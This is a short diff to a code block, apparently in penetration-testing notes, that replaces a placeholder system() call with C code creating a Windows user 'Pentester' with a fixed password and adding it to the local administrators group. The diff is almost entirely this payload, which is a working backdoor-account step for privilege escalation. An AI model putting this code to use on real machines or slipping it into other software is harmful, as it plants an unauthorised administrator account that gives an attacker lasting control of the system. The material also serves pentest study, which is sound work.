@@ -8,8 +8,14 @@
 ```c
 #include <stdlib.h>
 
-int main(){
-	system("Your command here");
+int main ()
+{
+  int i;
+  
+  // i for debugging
+  i = system ("net user Pentester Password1 /add");
+  i = system ("net localgroup administrators Pentester /add");
+  
   return 0;
 }
 ```
